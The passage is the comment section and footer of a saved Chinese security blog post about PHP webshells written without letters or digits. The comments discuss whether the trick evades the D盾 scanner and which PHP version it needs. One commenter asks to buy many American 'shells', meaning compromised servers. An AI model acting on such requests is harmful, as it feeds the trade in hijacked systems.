+                            2017 四月 28 23:10
+                        </time>
+<a href="javascript:reply_to('2678', '外贸')">回复</a>
+</p>
+<p class="comment-meta">楼主 有shell卖吗？ 我需要大量美国shell</p>
+</div>
+</div>
+<div class="row" id="comment-2622">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">MT</a>
+<time datetime="2017年4月15日 15:22" itemprop="datePublished">
+                            2017 四月 15 15:22
+                        </time>
+<a href="javascript:reply_to('2622', 'MT')">回复</a>
+</p>
+<p class="comment-meta">好思路 ， ''.[] 真绝了</p>
+</div>
+</div>
+<div class="row" id="comment-2575">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/36a58082d4c5437f1fa872de033ac2ad.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.hack-sb.com" target="_blank">轩</a>
+<time datetime="2017年3月2日 10:55" itemprop="datePublished">
+                            2017 三月 02 10:55
+                        </time>
+<a href="javascript:reply_to('2575', '轩')">回复</a>
+</p>
+<p class="comment-meta">D盾全报</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2576">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com" target="_blank">phithon</a>
+<time datetime="2017年3月2日 14:56" itemprop="datePublished">
+                            2017 三月 02 14:56
+                        </time>
+<a href="javascript:reply_to('2576', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@轩 小游戏而已，我是不会在实际环境用这类webshell的，符号熵值这么大一看就有问题，正常代码怎么可能不包含字母，D盾报警很正常。如果你需要一些正常一点的一句话，移步这篇文章 https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2550">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/16e1abaac300566d44609144ce2c924a.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">sqvds</a>
+<time datetime="2017年2月19日 20:50" itemprop="datePublished">
+                            2017 二月 19 20:50
+                        </time>
+<a href="javascript:reply_to('2550', 'sqvds')">回复</a>
+</p>
+<p class="comment-meta">想问一下博主具体的php版本是5.X?我在5.5测试第一种方法没能成功</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2551">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com" target="_blank">phithon</a>
+<time datetime="2017年2月19日 22:33" itemprop="datePublished">
+                            2017 二月 19 22:33
+                        </time>
+<a href="javascript:reply_to('2551', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@sqvds "因为其中存在很多不可打印字符，所以我用url编码表示了。"，直接执行文中的代码肯定会出错。</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2553">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/16e1abaac300566d44609144ce2c924a.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">sqvds</a>
+<time datetime="2017年2月21日 15:47" itemprop="datePublished">
+                            2017 二月 21 15:47
+                        </time>
+<a href="javascript:reply_to('2553', 'sqvds')">回复</a>
+</p>
+<p class="comment-meta">@phithon 好的谢谢博主</p>
+</div>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2548">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/c2b03eafa8970bf355035838bfd83beb.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://r00tuserclient.xyz" target="_blank">点滴</a>
+<time datetime="2017年2月17日 23:35" itemprop="datePublished">
+                            2017 二月 17 23:35
+                        </time>
+<a href="javascript:reply_to('2548', '点滴')">回复</a>
+</p>
+<p class="comment-meta">后面弱类型利用的出身入化</p>
+</div>
+</div>
+<div class="row" id="comment-2546">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./一些不包含数字和字母的webshell  离别歌/81206b7be1d0bc1e238342791ffbdb41.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">文雨</a>
+<time datetime="2017年2月17日 09:44" itemprop="datePublished">
+                            2017 二月 17 09:44
+                        </time>
+<a href="javascript:reply_to('2546', '文雨')">回复</a>
+</p>
+<p class="comment-meta">也是脑洞大开啊，赞一个</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="f43b11ecaa578f2153c7fb595c65508feb03c12a"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./一些不包含数字和字母的webshell  离别歌/f43b11ecaa578f2153c7fb595c65508feb03c12a"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="407">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="5fc0QgyGku2QTSLYPd8jv4yhYL8Dl97aDzxwEKKVLhWfTx9dDuC34IAm7PBL4DWk"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./一些不包含数字和字母的webshell  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./一些不包含数字和字母的webshell  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
